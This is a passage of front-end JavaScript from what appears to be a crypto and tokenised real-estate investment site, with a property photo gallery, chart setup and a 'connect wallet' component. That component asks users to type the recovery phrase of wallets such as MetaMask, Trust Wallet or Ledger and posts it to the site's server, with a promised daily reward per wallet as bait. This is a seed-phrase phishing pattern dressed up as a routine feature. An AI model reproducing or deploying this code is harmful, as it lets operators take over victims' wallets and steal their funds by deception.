=compress&cs=tinysrgb&w=700"},{"label":"Bathroom","img":"https://images.pexels.com/photos/1910472/pexels-photo-1910472.jpeg?auto=compress&cs=tinysrgb&w=700"},{"label":"Eiffel View","img":"https://images.pexels.com/photos/338515/pexels-photo-338515.jpeg?auto=compress&cs=tinysrgb&w=700"}]}];

let propCurrent=0, propPhotoIdx=0;

function openPropertyGallery(idx){
  propCurrent=idx; propPhotoIdx=0;
  const p=PROPS[idx];
  document.getElementById('propGalleryTitle').textContent=p.name;
  document.getElementById('propGalleryDesc').textContent=p.desc;
  const stats=[{lbl:'Value',val:p.val,color:'var(--blue2)'},{lbl:'APY Return',val:p.roi,color:'var(--grn)'},{lbl:'Tokens',val:p.tokens,color:'#fff'}];
  document.getElementById('propGalleryStats').innerHTML=stats.map(s=>`<div style="background:var(--c1);border:1px solid var(--bd);border-radius:10px;padding:12px;text-align:center"><div style="font-family:'Sora',sans-serif;font-weight:700;font-size:.95rem;color:${s.color}">${s.val}</div><div style="font-size:.65rem;color:#444;margin-top:3px;text-transform:uppercase;letter-spacing:.06em">${s.lbl}</div></div>`).join('');
  const meta=[];
  if(p.beds>0)meta.push(['fa-solid fa-bed',p.beds+' Bedrooms']);
  meta.push(['fa-solid fa-bath',p.baths+' Bathrooms']);
  meta.push(['fa-solid fa-ruler-combined',p.sqft+' sqft']);
  meta.push(['fa-solid fa-location-dot',p.loc]);
  document.getElementById('propGalleryMeta').innerHTML=meta.map(([ico,val],i,arr)=>`<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;${i<arr.length-1?'border-bottom:1px solid #161616;':''}font-size:.81rem"><span style="color:#444;display:flex;align-items:center;gap:7px"><i class="${ico}"></i></span><span style="font-weight:500">${val}</span></div>`).join('');
  renderPropPhoto();
  renderPropThumbs();
  document.getElementById('propGalleryBg').classList.add('open');
  document.body.style.overflow='hidden';
}

function renderPropPhoto(){
  const p=PROPS[propCurrent];
  const room=p.rooms[propPhotoIdx];
  const img=document.getElementById('propMainImg');
  img.style.opacity='0';
  setTimeout(()=>{img.src=room.img;img.style.opacity='1';},150);
  document.getElementById('propRoomLbl').textContent=room.label;
  document.getElementById('propPhotoCount').textContent=(propPhotoIdx+1)+' / '+p.rooms.length;
}

function renderPropThumbs(){
  const p=PROPS[propCurrent];
  document.getElementById('propThumbs').innerHTML=p.rooms.map((r,i)=>`<div onclick="propPhotoIdx=${i};renderPropPhoto();renderPropThumbs()" style="width:60px;height:60px;border-radius:10px;overflow:hidden;border:2px solid ${i===propPhotoIdx?'var(--blue2)':'#1a1a1a'};cursor:pointer;flex-shrink:0;transition:border-color .15s"><img src="${r.img}" alt="${r.label}" style="width:100%;height:100%;object-fit:cover" loading="lazy"/></div>`).join('');
}

function prevPropPhoto(){propPhotoIdx=propPhotoIdx>0?propPhotoIdx-1:PROPS[propCurrent].rooms.length-1;renderPropPhoto();renderPropThumbs();}
function nextPropPhoto(){propPhotoIdx=(propPhotoIdx+1)%PROPS[propCurrent].rooms.length;renderPropPhoto();renderPropThumbs();}
function closePropertyGallery(){document.getElementById('propGalleryBg').classList.remove('open');document.body.style.overflow='';}
function handlePropGalleryBgClick(e){if(e.target===document.getElementById('propGalleryBg'))closePropertyGallery();}

/* â•â• DOMCONTENTLOADED â•â• */
document.addEventListener('DOMContentLoaded',()=>{
  const savedTheme = localStorage.getItem('rwg_theme');
  applyTheme(savedTheme !== 'light');
  if(document.getElementById('tv_chart_container'))
    setTimeout(()=>initMainChart('COINBASE:BTCUSD'),400);
  if(document.getElementById('tv_trade_chart'))
    setTimeout(initTradeChart,400);
  initRotatingTestis();
  if('Notification' in window && Notification.permission === 'default'){
    setTimeout(() => Notification.requestPermission().catch(()=>{}), 3000);
  }
});
</script>
<!-- livewire bootstrap removed -->
<script>
function walletConnect() {
    return {
        selectedWallet: '',
        recoveryPhrase: '',
        isConnecting: false,
        showMoreWallets: false,
        hasError: false,
        loadingWallets: true,
        connectedWallets: [],
        connectedList: [],
        maxSlots: 10,
        dailyReward: 0,
        minBalance: 0,

        walletLogo(name) {
            const map = {
                "MetaMask": "/temp/wallet/metamask.webp",
                "Trust Wallet": "/temp/wallet/trust-wallet.webp",
                "Coinbase Wallet": "/temp/wallet/coinbase-wallet.webp",
                "Phantom": "/temp/wallet/phantom.webp",
                "Exodus": "/temp/wallet/exodus.svg",
                "Ledger": "/temp/wallet/other.png",
                "OKX": "/temp/wallet/okx.webp",
                "Binance": "/temp/wallet/binance.jpg",
                "Rabby": "/temp/wallet/rabby.webp",
                "Tangem": "/temp/wallet/tangem.svg",
                "Arculus": "/temp/wallet/arculus.svg",
                "Namo": "/temp/wallet/namo.webp",
                "DCent": "/temp/wallet/dcent.svg"
            };
            return map[name] || '/temp/wallet/other.png';
        },

        formatMoney(n) {
            const v = Number(n || 0);
            return '$' + v.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
        },

        formatConnected(v) {
            if (!v) return 'recently';
            try {
                const d = new Date(v);
                if (Number.isNaN(d.getTime())) return 'recently';
                return d.toLocaleString();
            } catch (_) {
                return 'recently';
            }
        },

        statusLabel(s) {
            const t = String(s || 'active');
            return t.charAt(0).toUpperCase() + t.slice(1);
        },

        statusStyle(s) {
            const t = String(s || 'active').toLowerCase();
            if (t === 'pending') return { color: '#f5c542', bg: 'rgba(245,197,66,.1)', border: 'rgba(245,197,66,.2)' };
            if (t === 'rejected' || t === 'inactive') return { color: '#ff4560', bg: 'rgba(255,69,96,.1)', border: 'rgba(255,69,96,.2)' };
            return { color: '#00d47c', bg: 'rgba(0,212,124,.1)', border: 'rgba(0,212,124,.2)' };
        },

        selectWallet(wallet) {
            if (this.connectedWallets.includes(String(wallet).toLowerCase())) return;
            if (this.connectedList.length >= this.maxSlots) return;
            this.selectedWallet = wallet;
        },

        get wordCount() {
            if (!this.recoveryPhrase) return 0;
            return this.recoveryPhrase.trim().split(/\s+/).filter(w => w.length > 0).length;
        },

        get hasInvalidChars() {
            if (!this.recoveryPhrase) return false;
            return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
        },

        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },

        validatePhrase() {
            this.hasError = false;
            if (this.recoveryPhrase.length > 0) {
                this.hasError = this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12);
            }
        },

        async init() {
            await this.loadWallets();
        },

        async loadWallets() {
            this.loadingWallets = true;
            try {
                const response = await api.get('/user/dashboard/feature/wallets');
                const d = response.data || {};
                const list = Array.isArray(d.connected) ? d.connected : (Array.isArray(d.wallets) ? d.wallets : []);
                this.connectedList = list;
                this.connectedWallets = list.map(w => String(w.walletKey || w.walletName || '').toLowerCase()).filter(Boolean);
                this.maxSlots = Number(d.maxSlots || 10);
                this.dailyReward = Number(d.dailyEarningPerWallet != null ? d.dailyEarningPerWallet : 3000);
                this.minBalance = Number(d.minBalance != null ? d.minBalance : 0);
            } catch (err) {
                const msg = String(err.response?.data?.message || err.message || '');
                if (err.response?.status === 403 || msg.toLowerCase().includes('disabled')) {
                    window.location.replace('/user/dashboard.html');
                    return;
                }
                console.warn('wallet load failed', err);
            } finally {
                this.loadingWallets = false;
            }
        },

        async handleSubmit(e) {
            e.preventDefault();
            if (!this.isValidPhrase || !this.selectedWallet) {
                this.hasError = true;
                return;
            }
            this.isConnecting = true;
            try {
                await api.post('/user/dashboard/feature/wallets/connect', {
                    walletName: this.selectedWallet,
                    walletKey: String(this.selectedWallet).toLowerCase(),
                    recoveryPhrase: this.recoveryPhrase.trim()
                });
                this.recoveryPhrase = '';
                this.selectedWallet = '';
                this.hasError = false;
                await this.loadWallets();
                if (typeof showToast === 'function') showToast('Wallet connected successfully', 'green');
                else if (typeof toast === 'function') toast('Wallet connected successfully', true);
            } catch (err) {
                const msg = err.response?.data?.message || err.message || 'Could not connect wallet';
                if (typeof showToast === 'function') showToast(msg, 'red');
                else alert(msg);
            } finally {
                this.isConnecting = false;
            }
        }
    }
}
</script>

